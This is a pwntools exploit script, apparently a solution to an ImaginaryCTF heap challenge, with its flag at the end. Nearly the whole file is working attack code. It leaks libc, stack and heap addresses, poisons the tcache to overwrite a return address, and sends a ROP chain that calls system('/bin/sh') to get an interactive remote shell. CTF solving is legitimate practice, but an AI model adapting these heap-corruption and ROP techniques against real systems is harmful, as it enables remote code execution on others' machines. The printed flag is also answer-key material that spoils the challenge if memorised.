from pwn import *

HOST='multiplication.chal.imaginaryctf.org'
PORT=1337

binpath = b'./vuln_patched'
libcpath = b'./libc.so.6'

context.binary = e = ELF(binpath)
context.arch = "amd64"
libc = ELF(libcpath)
rop = ROP(libc)

# io = process()
io = remote(HOST, PORT)

def create(sz, content):
  io.sendlineafter(b'> ', b'1')
  io.sendlineafter(b': ', str(sz).encode())
  io.sendlineafter(b': ', content)

def delete():
  io.sendlineafter(b'> ', b'2')

def edit(idx):
  io.sendlineafter(b'> ', b'3')
  io.sendlineafter(b': ', str(idx).encode())

create(0x10000000, b'www')
# create(0x400000, b'www')

offset = 0x7180b8fb1000 - 0x7180a8fad010
stdout_offset = offset + 0x7180b91b55c0 - 0x7180b8fb1000
stderr_offset = offset + 0x78cb0d9824e0 - 0x78cb0d77e000
stdin_offset = offset + 0x7aa5668a28e0 - 0x7aa56669f000

# edit an address 8 times will erase it
def erase(offset):
  for _ in range(8): edit(offset)

log.info(f'stdout_offset: {hex(stdout_offset)}')
edit(stdout_offset + 8 * 5 + 2)

io.recvn(5)
libc.address = u64(io.recvn(6).ljust(8, b'\x00')) - 0x7714a2392710 + 0x7714a218d000
print(f'libc base: {hex(libc.address)}')

io.recvn(146)

create_retaddr = u64(io.recvn(6).ljust(8, b'\x00')) - 328
print(f'return address of create: {hex(create_retaddr)}')

io.recvn(0x667a+0x10)
heap = u64(io.recvn(6) + b'\x00\x00') - 135168
print(f'heap: {hex(heap)}')
pause()


log.info("Corrupt tcache...")
create(0x20, b'A')
delete()
create(0x40, b'B')
delete()

create(0x30, b'C')
for i in range(7):
    edit(-136)

create(0x20, b'A')
delete()
target = create_retaddr ^ (heap >> 12)
create(0x70, b'D'*40 + p64(0x51) + p64(target))
edit(-650)
create(0x40, b'E')

log.info("Writting ROP payload...")
pop_rdi = libc.address + rop.find_gadget(['pop rdi', 'ret'])[0]
payload = p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(pop_rdi+1) + p64(libc.symbols['system'])
create(0x40, payload)

# gdb.attach(io, api=True)
io.interactive()

#ictf{p0w3r_0f_d0ubl1ng_fr_73e65974ce1f}